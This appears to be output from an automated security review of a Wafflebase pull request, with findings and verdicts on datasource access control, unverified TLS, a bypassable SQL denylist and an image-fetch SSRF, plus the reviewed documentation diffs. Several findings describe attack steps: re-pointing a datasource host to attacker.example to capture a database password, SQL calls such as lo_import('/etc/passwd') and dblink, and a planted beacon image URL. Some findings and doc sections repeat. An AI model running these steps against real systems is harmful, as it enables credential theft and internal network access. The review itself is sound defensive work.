findings.summary: A single failed image fetch aborts the whole PPTX export, unlike the PDF path which degrades gracefully
findings.evidence: `fetchImage: async (src) => { const blob = await docsImageFetcher(src); ... }` has no try/catch. `docsImageFetcher` (export-utils.ts:52) throws `Image fetch failed: <status>` on any non-ok response, and `exportPptx` (packages/slides/src/export/pptx/index.ts:162) awaits it inside a bare loop, so the rejection propagates out of `exportSlidesPptxAndDownload` and the user gets 'Export failed: Image fetch failed: 404' with no file at all. The sibling PDF exporter explicitly guards this: packages/slides/src/export/pdf.ts:277-282 wraps `fetcher(src)` in try/catch and falls back to `BLANK_PNG`. One deleted/unreachable image (e.g. an image uploaded to a workspace the user lost access to, or a stale src after an import) therefore makes the deck permanently un-exportable to PPTX, while PDF still works.

mergedFrom.summary: No progress feedback during the image-fetch phase of a PPTX export
mergedFrom.evidence: `exportPptx` fetches every unique image serially (packages/slides/src/export/pptx/index.ts:161-166) before the first `onProgress?.(0, slideTotal, 'slides')` call at line 272. On an image-heavy deck the trigger spins with no toast at all until every image has downloaded. Reporting an 'images' phase from the fetchImage bridge would match the toast contract described in the new doc comment.

findings.summary: `blob.type || "image/png"` can mislabel image bytes, producing a media part with the wrong extension/content-type
findings.evidence: `mime: blob.type || "image/png"` — when the backend response carries no Content-Type (blob.type === "") or an unexpected one (e.g. "application/octet-stream", "image/svg+xml"), `extFromMime` in packages/slides/src/export/pptx/index.ts:82-98 defaults to 'png'. The JPEG/GIF bytes are then stored as `ppt/media/imageN.png` and declared as PNG in [Content_Types].xml, which PowerPoint may refuse to render. Sniffing the leading magic bytes, or at least mapping via the src extension, would be more robust.

findings.summary: Any workspace member can steal another member's stored DB password by re-pointing a datasource's host and hitting /test
findings.evidence: The new docs page `packages/documentation/sheets/datasources.md:45` documents datasources as owner-scoped ("The connection belongs to the person who created it"), but the endpoints it documents enforce only workspace membership. `PATCH /datasources/:id` (datasource.controller.ts:93-105) calls `assertMember` only — `assertMember` (workspace.service.ts:167-175) accepts ANY role, including viewer — and `DataSourceService.update` (datasource.service.ts:80-99) lets the caller change `host`/`port` while leaving the stored encrypted `password` untouched. The attacker then calls `POST /datasources/:id/test` (controller.ts:120-131), which builds a client with `password: decrypt(ds.password)` (datasource.service.ts:203) and connects to the attacker-controlled host. Attack: member B PATCHes owner A's datasource to `host: attacker.example`, clicks Test Connection, and their Postgres listener answers `AuthenticationCleartextPassword` — A's production DB password arrives in plaintext. `ssl: { rejectUnauthorized: false }` (service.ts:204) means even an SSL-enabled datasource offers no protection. No ownership check exists on update/test/query/delete anywhere in the module.
searchedFor: grep for authorID usage in datasource module

findings.summary: New docs page misstates the datasource access model: collaborators can execute queries with the owner's stored credentials
findings.evidence: datasources.md:45-46 tells users "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." In code, `POST /datasources/:id/query` (packages/backend/src/datasource/datasource.controller.ts:133-145) checks only `assertMember(ds.workspaceId, userId)` and then `DataSourceService.executeQuery` connects with the owner's decrypted credentials (datasource.service.ts:138 → createClient → decrypt at :203). Any workspace member — including a `viewer` per workspace.service.ts:167-175 — can therefore run arbitrary SELECTs against another member's database. Publishing the opposite guarantee invites admins to attach production credentials they believe are private to them, so the doc itself increases exposure.

findings.summary: Datasource SSL uses rejectUnauthorized:false, so the documented "SSL" toggle gives no MITM protection
findings.evidence: The new page instructs users to enable SSL (packages/documentation/sheets/datasources.md:14: "**SSL** — toggle on if your database requires it"), implying a protected channel. `createClient` sets `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204): the server certificate is never validated, so any on-path attacker (or the host-rewrite attack above) can terminate TLS, harvest the plaintext DB password from the startup handshake, and tamper with returned rows. Documenting the toggle without noting it is unauthenticated TLS is a security-relevant misrepresentation.

findings.summary: "Read-only" guarantee advertised by the new docs page rests on a bypassable SQL keyword denylist
findings.evidence: datasources.md:37 states "The results grid is **read-only** — it reflects the database", and the export/interop copy leans on the same framing. Enforcement is `validateSelectQuery` (sql-validator.ts:1-70): a denylist of INSERT/UPDATE/DELETE/DROP/ALTER/CREATE/TRUNCATE/GRANT/REVOKE/EXEC(UTE) plus a first-token check. It does not cover side-effecting constructs reachable inside `SELECT * FROM (<query>) AS _q` (datasource.service.ts:150) — e.g. `SELECT lo_import('/etc/passwd')`, `SELECT dblink('...','...')` (outbound SSRF from the backend to internal hosts), `SELECT pg_read_file(...)`, `SELECT some_volatile_write_fn()`, `SELECT pg_sleep(...)` for DoS — nor keywords such as COPY/DO/CALL/MERGE/VACUUM/COMMENT that a future first-token change would expose. Comment stripping (lines 28-31) and string stripping (line 60) operate on a copy while the raw `dto.query` is what executes, so validator and executor see different text — a classic denylist/parser divergence. Impact if real: any workspace member turns the documented read-only console into arbitrary function execution / internal network access against the target DB.

findings.summary: PPTX export fetches document-controlled image URLs with credentials:"include" and no scheme/host allowlist
findings.evidence: `exportSlidesPptxAndDownload` passes each element's raw `data.src` into `docsImageFetcher` (pptx-actions.ts:93-99). `docsImageFetcher` (packages/frontend/src/app/docs/export-utils.ts:46-56) resolves it via `resolveImageUrl`, which deliberately passes through ANY absolute scheme (export-utils.ts:15 — http(s), data, blob, file) and then does `fetch(resolved, { credentials: "include" })`. `src` is not restricted to uploaded images: the UI path only writes backend URLs (slides/insert-image.ts:66), but a collaborator with write access — or the now-documented `PUT /documents/:did/content` for slides (packages/documentation/developers/rest-api.md:289-293) — can store `data.src: "https://attacker.example/beacon"` or an internal URL. When a victim later clicks Export → PowerPoint, their browser issues a credentialed GET to the attacker's chosen origin (deanonymization/beacon, CSRF-shaped GET to internal or same-origin endpoints), and any readable response bytes are embedded verbatim into the produced `ppt/media/` part. The same fetcher feeds the CLI export path (packages/cli/src/commands/slides.ts:207 → cli/src/docs/image-fetcher.ts:45-56), where a server/CI-side export turns the untrusted `src` into true SSRF (e.g. cloud metadata) with the bytes landing in a possibly-published artifact. No allowlist of schemes or of the backend image host exists on either path; the PDF/DOCX exporters share the flaw, so this hunk widens an existing gap rather than creating it.

findings.summary: create/update return the datasource row including the encrypted password, unlike the masked read paths
findings.evidence: `findAllByWorkspace` (service.ts:66-69) and `findOne` (service.ts:77) deliberately replace `password` with `********`, but `create` (service.ts:44-56) and `update` (service.ts:95-98) return the Prisma row verbatim, so the AES-GCM ciphertext of the DB password is handed back to any workspace member who creates or PATCHes a datasource (controller.ts:43, :104). The value is not plaintext, but it leaks ciphertext + IV + tag outside the trust boundary and defeats the masking convention the read paths establish; it also gives an attacker a target to replay if the encryption key is ever rotated/leaked.

findings.summary: safeFilename (now also used for .pptx) does not strip control or bidi-override characters from the attacker-influenceable title
findings.evidence: The diff extends `safeFilename` to the pptx path (export-utils.ts:145-153, used at pptx-actions.ts:103). Sanitization removes only `\ / : * ? " < > |`; C0 control characters, U+202E RIGHT-TO-LEFT OVERRIDE and friends survive. A deck title set by a collaborator (`Report‮xcod.pptx`) yields a download filename that renders with a spoofed extension, and control characters can truncate/confuse shells and archive tools that later process the download. Hardening: strip `[\x00-\x1f\x7f‎‏‪-‮]` and leading dots before appending the extension.

+# Import & Export
+
+Wafflebase reads and writes the file formats your team already uses, so you
+can bring existing work in and take finished work out. Nothing is locked to
+the platform.
+
+## At a glance
+
+| Product | Import | Export |
+|---------|--------|--------|
+| **Sheets** | Excel (`.xlsx`) | — *(CSV/JSON via [CLI](../developers/cli))* |
+| **Docs** | Word (`.docx`) | Word (`.docx`), PDF (`.pdf`) |
+| **Slides** | PowerPoint (`.pptx`) | PowerPoint (`.pptx`), PDF (`.pdf`) |
+
+Import always creates a **new** document; it never overwrites an open one.
+Export downloads a file from the document you are editing.
+
+## Importing files
+
+From your workspace, open the **New** menu and choose an import option:
+
+- **Import XLSX** — creates a new spreadsheet from an Excel workbook. Each
+  sheet in the workbook becomes a tab. Values, formulas, and basic cell
+  formatting are brought across.
+- **Import DOCX** — creates a new document from a Word file, mapping
+  paragraphs, headings, lists, tables, and inline formatting into the editor.
+- **Import PPTX** — creates a new deck from a PowerPoint file: slides,
+  text boxes, shapes, images, tables, and theme colors are converted to
+  native Wafflebase elements.
+
+Large files show a progress indicator while they are parsed and any embedded
+images are uploaded into your workspace.
+
+## Exporting files
+
+### Docs
+
+In the document editor, open the **Export** menu (the download icon in the
+header) and choose:
+
+- **Word (`.docx`)** — the full document, including tables and headers/footers.
+- **PDF (`.pdf`)** — a paginated, print-ready PDF that mirrors the on-screen
+  page layout.
+
+### Slides
+
+In the presentation editor, open the **Export** menu and choose:
+
+- **PowerPoint (`.pptx`)** — an editable deck with slides, shapes, text,
+  images, tables, and the theme preserved as DrawingML.
+- **PDF (`.pdf`)** — one slide per page, ready to share or print.
+
+### Sheets
+
+Spreadsheets export to CSV or JSON through the
+[command-line tool](../developers/cli) (`wafflebase sheets …`). A built-in
+download menu in the grid editor is on the roadmap.
+
+## Fidelity notes
+
+Wafflebase aims for a faithful round-trip, but the source formats are large
+and some constructs have no exact equivalent:
+
+- **PPTX/DOCX import is best-effort.** Common content — text, lists, tables,
+  shapes, images, and theme colors — converts cleanly. Rare or
+  application-specific features (embedded objects, macros, exotic effects) may
+  be simplified or dropped.
+- **Fonts** referenced by an imported file must be available in Wafflebase to
+  render identically; otherwise a close fallback is substituted.
+- **Re-exporting** a file you imported will not be byte-identical to the
+  original, but preserves the structure and content faithfully.
+
+## Automating with the CLI
+
+Every import/export path above is also scriptable. See the
+[CLI reference](../developers/cli) for `docs export`, `docs import`,
+`slides export`, `slides import`, and the `sheets` cell import/export
+commands — useful for batch conversions and pipelines.

+# External Datasources
+
+A **datasource** connects a spreadsheet to an external PostgreSQL database. You
+write a SQL query and its results appear in a read-only tab, right next to your
+regular editable sheets.
+
+## Connect a database
+
+1. Click the **+** at the end of the tab bar and choose **New DataSource**.
+2. In the **Select DataSource** dialog, fill in the connection details:
+   - **Name** — a label for the connection
+   - **Host** and **Port** (defaults to `5432`)
+   - **Database**, **Username**, and **Password**
+   - **SSL** — toggle on if your database requires it
+3. Click **Test Connection** to confirm the credentials work, then save.
+
+A new tab is added with a database icon to distinguish it from sheet tabs.
+
+## Run a query
+
+The datasource tab has a SQL editor at the top and a results grid below it.
+
+1. Type a `SELECT` query — for example, `SELECT * FROM users LIMIT 100`.
+2. Click **Execute**, or press **⌘+Enter** / **Ctrl+Enter**.
+
+The results load into the grid below: the first row holds the column names and
+each following row is a record. Re-run the query with **Execute** whenever you
+want fresh data — results don't refresh automatically.
+
+::: tip
+Queries are capped at 10,000 rows and a 30-second runtime, so add a `LIMIT`
+clause when exploring large tables.
+:::
+
+## Working with results
+
+- The results grid is **read-only** — it reflects the database, so you can't
+  edit, sort, or filter the cells in place. Shape the data with SQL instead.
+- Reference query results from other tabs with formulas, just like any sheet,
+  to build summaries and dashboards on top of live data.
+
+## Good to know
+
+- Datasources connect to **PostgreSQL** databases.
+- The connection belongs to the person who created it. Collaborators can see the
+  query and its last results, but run their own connection to execute it.
+- Only the latest query for a tab is saved.

+# Import & Export
+
+Wafflebase reads and writes the file formats your team already uses, so you
+can bring existing work in and take finished work out. Nothing is locked to
+the platform.
+
+## At a glance
+
+| Product | Import | Export |
+|---------|--------|--------|
+| **Sheets** | Excel (`.xlsx`) | — *(CSV/JSON via [CLI](../developers/cli))* |
+| **Docs** | Word (`.docx`) | Word (`.docx`), PDF (`.pdf`) |
+| **Slides** | PowerPoint (`.pptx`) | PowerPoint (`.pptx`), PDF (`.pdf`) |
+
+Import always creates a **new** document; it never overwrites an open one.
+Export downloads a file from the document you are editing.
+
+## Importing files
+
+From your workspace, open the **New** menu and choose an import option:
+
+- **Import XLSX** — creates a new spreadsheet from an Excel workbook. Each
+  sheet in the workbook becomes a tab. Values, formulas, and basic cell
+  formatting are brought across.
+- **Import DOCX** — creates a new document from a Word file, mapping
+  paragraphs, headings, lists, tables, and inline formatting into the editor.
+- **Import PPTX** — creates a new deck from a PowerPoint file: slides,
+  text boxes, shapes, images, tables, and theme colors are converted to
+  native Wafflebase elements.
+
+Large files show a progress indicator while they are parsed and any embedded
+images are uploaded into your workspace.
+
+## Exporting files
+
+### Docs
+
+In the document editor, open the **Export** menu (the download icon in the
+header) and choose:
+
+- **Word (`.docx`)** — the full document, including tables and headers/footers.
+- **PDF (`.pdf`)** — a paginated, print-ready PDF that mirrors the on-screen
+  page layout.
+
+### Slides
+
+In the presentation editor, open the **Export** menu and choose:
+
+- **PowerPoint (`.pptx`)** — an editable deck with slides, shapes, text,
+  images, tables, and the theme preserved as DrawingML.
+- **PDF (`.pdf`)** — one slide per page, ready to share or print.
+
+### Sheets
+
+Spreadsheets export to CSV or JSON through the
+[command-line tool](../developers/cli) (`wafflebase sheets …`). A built-in
+download menu in the grid editor is on the roadmap.
+
+## Fidelity notes
+
+Wafflebase aims for a faithful round-trip, but the source formats are large
+and some constructs have no exact equivalent:
+
+- **PPTX/DOCX import is best-effort.** Common content — text, lists, tables,
+  shapes, images, and theme colors — converts cleanly. Rare or
+  application-specific features (embedded objects, macros, exotic effects) may
+  be simplified or dropped.
+- **Fonts** referenced by an imported file must be available in Wafflebase to
+  render identically; otherwise a close fallback is substituted.
+- **Re-exporting** a file you imported will not be byte-identical to the
+  original, but preserves the structure and content faithfully.
+
+## Automating with the CLI
+
+Every import/export path above is also scriptable. See the
+[CLI reference](../developers/cli) for `docs export`, `docs import`,
+`slides export`, `slides import`, and the `sheets` cell import/export
+commands — useful for batch conversions and pipelines.

+# External Datasources
+
+A **datasource** connects a spreadsheet to an external PostgreSQL database. You
+write a SQL query and its results appear in a read-only tab, right next to your
+regular editable sheets.
+
+## Connect a database
+
+1. Click the **+** at the end of the tab bar and choose **New DataSource**.
+2. In the **Select DataSource** dialog, fill in the connection details:
+   - **Name** — a label for the connection
+   - **Host** and **Port** (defaults to `5432`)
+   - **Database**, **Username**, and **Password**
+   - **SSL** — toggle on if your database requires it
+3. Click **Test Connection** to confirm the credentials work, then save.
+
+A new tab is added with a database icon to distinguish it from sheet tabs.
+
+## Run a query
+
+The datasource tab has a SQL editor at the top and a results grid below it.
+
+1. Type a `SELECT` query — for example, `SELECT * FROM users LIMIT 100`.
+2. Click **Execute**, or press **⌘+Enter** / **Ctrl+Enter**.
+
+The results load into the grid below: the first row holds the column names and
+each following row is a record. Re-run the query with **Execute** whenever you
+want fresh data — results don't refresh automatically.
+
+::: tip
+Queries are capped at 10,000 rows and a 30-second runtime, so add a `LIMIT`
+clause when exploring large tables.
+:::
+
+## Working with results
+
+- The results grid is **read-only** — it reflects the database, so you can't
+  edit, sort, or filter the cells in place. Shape the data with SQL instead.
+- Reference query results from other tabs with formulas, just like any sheet,
+  to build summaries and dashboards on top of live data.
+
+## Good to know
+
+- Datasources connect to **PostgreSQL** databases.
+- The connection belongs to the person who created it. Collaborators can see the
+  query and its last results, but run their own connection to execute it.
+- Only the latest query for a tab is saved.

samples.summary: Any workspace member can steal another member's stored DB password by re-pointing a datasource's host and hitting /test
samples.evidence: The new docs page `packages/documentation/sheets/datasources.md:45` documents datasources as owner-scoped ("The connection belongs to the person who created it"), but the endpoints it documents enforce only workspace membership. `PATCH /datasources/:id` (datasource.controller.ts:93-105) calls `assertMember` only — `assertMember` (workspace.service.ts:167-175) accepts ANY role, including viewer — and `DataSourceService.update` (datasource.service.ts:80-99) lets the caller change `host`/`port` while leaving the stored encrypted `password` untouched. The attacker then calls `POST /datasources/:id/test` (controller.ts:120-131), which builds a client with `password: decrypt(ds.password)` (datasource.service.ts:203) and connects to the attacker-controlled host. Attack: member B PATCHes owner A's datasource to `host: attacker.example`, clicks Test Connection, and their Postgres listener answers `AuthenticationCleartextPassword` — A's production DB password arrives in plaintext. `ssl: { rejectUnauthorized: false }` (service.ts:204) means even an SSL-enabled datasource offers no protection. No ownership check exists on update/test/query/delete anywhere in the module.

samples.summary: New docs page misstates the datasource access model: collaborators can execute queries with the owner's stored credentials
samples.evidence: datasources.md:45-46 tells users "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." In code, `POST /datasources/:id/query` (packages/backend/src/datasource/datasource.controller.ts:133-145) checks only `assertMember(ds.workspaceId, userId)` and then `DataSourceService.executeQuery` connects with the owner's decrypted credentials (datasource.service.ts:138 → createClient → decrypt at :203). Any workspace member — including a `viewer` per workspace.service.ts:167-175 — can therefore run arbitrary SELECTs against another member's database. Publishing the opposite guarantee invites admins to attach production credentials they believe are private to them, so the doc itself increases exposure.

samples.summary: Datasource SSL uses rejectUnauthorized:false, so the documented "SSL" toggle gives no MITM protection
samples.evidence: The new page instructs users to enable SSL (packages/documentation/sheets/datasources.md:14: "**SSL** — toggle on if your database requires it"), implying a protected channel. `createClient` sets `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204): the server certificate is never validated, so any on-path attacker (or the host-rewrite attack above) can terminate TLS, harvest the plaintext DB password from the startup handshake, and tamper with returned rows. Documenting the toggle without noting it is unauthenticated TLS is a security-relevant misrepresentation.

samples.summary: "Read-only" guarantee advertised by the new docs page rests on a bypassable SQL keyword denylist
samples.evidence: datasources.md:37 states "The results grid is **read-only** — it reflects the database", and the export/interop copy leans on the same framing. Enforcement is `validateSelectQuery` (sql-validator.ts:1-70): a denylist of INSERT/UPDATE/DELETE/DROP/ALTER/CREATE/TRUNCATE/GRANT/REVOKE/EXEC(UTE) plus a first-token check. It does not cover side-effecting constructs reachable inside `SELECT * FROM (<query>) AS _q` (datasource.service.ts:150) — e.g. `SELECT lo_import('/etc/passwd')`, `SELECT dblink('...','...')` (outbound SSRF from the backend to internal hosts), `SELECT pg_read_file(...)`, `SELECT some_volatile_write_fn()`, `SELECT pg_sleep(...)` for DoS — nor keywords such as COPY/DO/CALL/MERGE/VACUUM/COMMENT that a future first-token change would expose. Comment stripping (lines 28-31) and string stripping (line 60) operate on a copy while the raw `dto.query` is what executes, so validator and executor see different text — a classic denylist/parser divergence. Impact if real: any workspace member turns the documented read-only console into arbitrary function execution / internal network access against the target DB.

samples.summary: PPTX export fetches document-controlled image URLs with credentials:"include" and no scheme/host allowlist
samples.evidence: `exportSlidesPptxAndDownload` passes each element's raw `data.src` into `docsImageFetcher` (pptx-actions.ts:93-99). `docsImageFetcher` (packages/frontend/src/app/docs/export-utils.ts:46-56) resolves it via `resolveImageUrl`, which deliberately passes through ANY absolute scheme (export-utils.ts:15 — http(s), data, blob, file) and then does `fetch(resolved, { credentials: "include" })`. `src` is not restricted to uploaded images: the UI path only writes backend URLs (slides/insert-image.ts:66), but a collaborator with write access — or the now-documented `PUT /documents/:did/content` for slides (packages/documentation/developers/rest-api.md:289-293) — can store `data.src: "https://attacker.example/beacon"` or an internal URL. When a victim later clicks Export → PowerPoint, their browser issues a credentialed GET to the attacker's chosen origin (deanonymization/beacon, CSRF-shaped GET to internal or same-origin endpoints), and any readable response bytes are embedded verbatim into the produced `ppt/media/` part. The same fetcher feeds the CLI export path (packages/cli/src/commands/slides.ts:207 → cli/src/docs/image-fetcher.ts:45-56), where a server/CI-side export turns the untrusted `src` into true SSRF (e.g. cloud metadata) with the bytes landing in a possibly-published artifact. No allowlist of schemes or of the backend image host exists on either path; the PDF/DOCX exporters share the flaw, so this hunk widens an existing gap rather than creating it.

samples.summary: create/update return the datasource row including the encrypted password, unlike the masked read paths
samples.evidence: `findAllByWorkspace` (service.ts:66-69) and `findOne` (service.ts:77) deliberately replace `password` with `********`, but `create` (service.ts:44-56) and `update` (service.ts:95-98) return the Prisma row verbatim, so the AES-GCM ciphertext of the DB password is handed back to any workspace member who creates or PATCHes a datasource (controller.ts:43, :104). DataSourceService.update (datasource.service.ts:80-99) writes dto.host/port/database/username while leaving the stored encrypted password untouched unless a new one is supplied (line 92), and UpdateDataSourceDto.host is validated only as a 1-253 char string (datasource.dto.ts:55-58) with no allowlist or internal-address filter. testConnection/executeQuery then reach createClient (datasource.service.ts:190-208), which sends password: decrypt(ds.password) (line 203) to the attacker-supplied host (line 199) with ssl: { rejectUnauthorized: false } (line 204), so even SSL-enabled datasources give no MITM protection. authorID is written at create (datasource.service.ts:53) but never read for authorization anywhere in packages/backend/src (the only ownership checks are share-link.service.ts:21,60, an unrelated module), so the ownership model documented at packages/documentation/sheets/datasources.md:45 is unenforced. No guard elsewhere makes this unreachable. Result: any workspace member of any role can re-point another member's datasource and exfiltrate the plaintext DB password, plus obtain an arbitrary-host SSRF primitive from the backend — broken access control and secret exposure, squarely in the security lane and blocking.

finding.summary: New docs page misstates the datasource access model: collaborators can execute queries with the owner's stored credentials
finding.evidence: datasources.md:45-46 tells users "The connection belongs to the person who created it. Collaborators can see the query and its last results, but run their own connection to execute it." In code, `POST /datasources/:id/query` (packages/backend/src/datasource/datasource.controller.ts:133-145) checks only `assertMember(ds.workspaceId, userId)` and then `DataSourceService.executeQuery` connects with the owner's decrypted credentials (datasource.service.ts:138 → createClient → decrypt at :203). Any workspace member — including a `viewer` per workspace.service.ts:167-175 — can therefore run arbitrary SELECTs against another member's database. Publishing the opposite guarantee invites admins to attach production credentials they believe are private to them, so the doc itself increases exposure.

verdict.reason: All three legs of the finding check out in the tree. (1) datasources.md:44-47 contains verbatim the claim that the connection "belongs to the person who created it" and that collaborators "run their own connection to execute it". (2) The query endpoint datasource.controller.ts:133-145 gates only on workspaceService.assertMember(ds.workspaceId, userId); workspace.service.ts:167-175 confirms assertMember returns any membership row without inspecting `role`, while the role-aware assertOwner at :177-188 is deliberately not used here — so any member (default invite role 'member', workspace.service.ts:107) passes. (3) datasource.service.ts:127-138 fetches the datasource by id alone with no authorID scoping and calls createClient, which at :198-207 sets password: decrypt(ds.password) — the creator's stored credentials. The frontend confirms execution is server-side (frontend/src/api/datasources.ts:104-108), and no per-user credential model exists anywhere. The documented access model is therefore the inverse of the enforced one: a collaborator runs arbitrary SELECTs on the creator's database with the creator's decrypted credentials. No refutation ground applies — the text is present, no guard makes it unreachable, and a published-but-unenforced confidentiality guarantee that invites operators to store production credentials they believe are private is squarely within the security lens (access control / sensitive data exposure).

finding.summary: Datasource SSL uses rejectUnauthorized:false, so the documented "SSL" toggle gives no MITM protection
finding.evidence: The new page instructs users to enable SSL (packages/documentation/sheets/datasources.md:14: "**SSL** — toggle on if your database requires it"), implying a protected channel. `createClient` sets `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` (datasource.service.ts:204): the server certificate is never validated, so any on-path attacker (or the host-rewrite attack above) can terminate TLS, harvest the plaintext DB password from the startup handshake, and tamper with returned rows. Documenting the toggle without noting it is unauthenticated TLS is a security-relevant misrepresentation.

verdict.reason: Verified both claims directly. datasource.service.ts:204 sets `ssl: ds.sslEnabled ? { rejectUnauthorized: false } : false` inside `createClient` (lines 190-208), the sole pg Client factory, used by `testConnection` (line 115) and `executeQuery` (line 138). A repo-wide grep for `rejectUnauthorized` returns only this one hit; there is no CA config, no `checkServerIdentity`, and no host allowlist that would mitigate it. The decrypted DB password is passed on line 203, so an on-path attacker presenting any self-signed certificate completes the handshake, captures plaintext credentials from the Postgres startup message, and can tamper with returned rows. Host/port are user-supplied and persisted (lines 47-48, 88-89), so the connection target is not pinned. documentation/sheets/datasources.md:14 does advertise the SSL toggle ("toggle on if your database requires it") with no note that TLS is unauthenticated. This is missing/weakened certificate verification, squarely in the Security lens's crypto/auth lane, and is reachable from both service entry points, so no not-present, already-guarded, or out-of-scope ground applies.

finding.summary: "Read-only" guarantee advertised by the new docs page rests on a bypassable SQL keyword denylist
finding.evidence: datasources.md:37 states "The results grid is **read-only** — it reflects the database", and the export/interop copy leans on the same framing. Enforcement is `validateSelectQuery` (sql-validator.ts:1-70): a denylist of INSERT/UPDATE/DELETE/DROP/ALTER/CREATE/TRUNCATE/GRANT/REVOKE/EXEC(UTE) plus a first-token check. It does not cover side-effecting constructs reachable inside `SELECT * FROM (<query>) AS _q` (datasource.service.ts:150) — e.g. `SELECT lo_import('/etc/passwd')`, `SELECT dblink('...','...')` (outbound SSRF from the backend to internal hosts), `SELECT pg_read_file(...)`, `SELECT some_volatile_write_fn()`, `SELECT pg_sleep(...)` for DoS — nor keywords such as COPY/DO/CALL/MERGE/VACUUM/COMMENT that a future first-token change would expose. Comment stripping (lines 28-31) and string stripping (line 60) operate on a copy while the raw `dto.query` is what executes, so validator and executor see different text — a classic denylist/parser divergence. Impact if real: any workspace member turns the documented read-only console into arbitrary function execution / internal network access against the target DB.

verdict.reason: Every element of the finding checks out against the repository. sql-validator.ts:1-13 is a pure denylist of DML/DDL keywords; lines 37-44 only require the first token to be SELECT or WITH; nothing restricts function calls. datasource.service.ts:150 wraps the RAW `dto.query` (not the comment/string-stripped copy the validator inspected) into `SELECT * FROM (${dto.query}) AS _q`, so validator and executor genuinely see different text. Side-effecting/read-primitive functions reachable inside a SELECT subquery — pg_read_file, lo_import, dblink (outbound SSRF from the backend to internal hosts), volatile write functions — all pass validation unchanged. I searched the entire backend for any compensating control (`read_only|READ ONLY|readOnly|transaction_read`) and found none: executeQuery only sets statement_timeout/TimeZone/DateStyle/lc_monetary (service.ts:144-147) and connects with the full stored credentials (createClient, service.ts:190-208), so there is no read-only transaction or least-privilege role backing the guarantee. The endpoint is reachable by any workspace member: datasource.controller.ts:133-145 applies only JwtAuthGuard plus assertMember, with no owner/role check, even though datasources.md:45-46 says the connection belongs to its creator. The advertised guarantee at datasources.md:37 ("The results grid is **read-only**") is therefore backed by a bypassable denylist. This is in the Security lane (unsafe input handling/injection, SSRF, path traversal / arbitrary file read) and is a real weakness, not a correctness-lens logic bug. No refutation ground applies: the code is present as described, not guarded elsewhere, and in scope.

finding.summary: PPTX export fetches document-controlled image URLs with credentials:"include" and no scheme/host allowlist
finding.evidence: `exportSlidesPptxAndDownload` passes each element's raw `data.src` into `docsImageFetcher` (pptx-actions.ts:93-99). `docsImageFetcher` (packages/frontend/src/app/docs/export-utils.ts:46-56) resolves it via `resolveImageUrl`, which deliberately passes through ANY absolute scheme (export-utils.ts:15 — http(s), data, blob, file) and then does `fetch(resolved, { credentials: "include" })`. `src` is not restricted to uploaded images: the UI path only writes backend URLs (slides/insert-image.ts:66), but a collaborator with write access — or the now-documented `PUT /documents/:did/content` for slides (packages/documentation/developers/rest-api.md:289-293) — can store `data.src: "https://attacker.example/beacon"` or an internal URL. When a victim later clicks Export → PowerPoint, their browser issues a credentialed GET to the attacker's chosen origin (deanonymization/beacon, CSRF-shaped GET to internal or same-origin endpoints), and any readable response bytes are embedded verbatim into the produced `ppt/media/` part. The same fetcher feeds the CLI export path (packages/cli/src/commands/slides.ts:207 → cli/src/docs/image-fetcher.ts:45-56), where a server/CI-side export turns the untrusted `src` into true SSRF (e.g. cloud metadata) with the bytes landing in a possibly-published artifact. No allowlist of schemes or of the backend image host exists on either path; the PDF/DOCX exporters share the flaw, so this hunk widens an existing gap rather than creating it.

verdict.reason: Verified independently: `exportSlidesPptxAndDownload` hands each element's raw `data.src` to `docsImageFetcher` (packages/frontend/src/app/slides/pptx-actions.ts:92-101), which calls `resolveImageUrl` — a function that by design returns ANY absolute-scheme URL untouched (packages/frontend/src/app/docs/export-utils.ts:12-18) — and then performs `fetch(resolved, { credentials: "include" })` (export-utils.ts:51), returning the response bytes to be embedded verbatim as a `ppt/media/` part (packages/slides/src/export/pptx/index.ts:137-166). The CLI mirror does the same without credentials but server/CI-side (packages/cli/src/docs/image-fetcher.ts:27-32,45-56), and its tests explicitly pin the pass-through of arbitrary absolute/data/blob URLs (packages/cli/test/image-fetcher.test.ts:8-27,75-89), so this is intended, not incidental. I searched widely for the allegedly missing allowlist and found no counterexample: repo-wide greps for allowlist/whitelist/isSafeUrl/validateUrl/protocol===/new URL(/startsWith('http surface only unrelated hits; `isSafeUrl` (packages/docs/src/view/url-detect.ts:7) is wired to hyperlink hrefs only (pdf-painter.ts:823, text-editor.ts:1256, docs-link-popover.tsx:176), never to image src; there is no CSP (no helmet, no Content-Security-Policy header or meta) to constrain connect-src; and the backend stores document content opaquely with no src sanitisation (packages/backend/src/document/document.service.ts has no image/src handling), so a write-capable collaborator or the documented PUT /documents/:did/content can plant an arbitrary src. Slides import always re-uploads image bytes (packages/slides/src/import/pptx/image.ts:88-90), so the UI path happens to be clean, but that is a source-side convention rather than a gate on the fetcher. In-lane (SSRF / credentialed cross-origin fetch with attacker-chosen URL and response bytes exfiltrated into the produced artifact); blocking as a major security weakness.
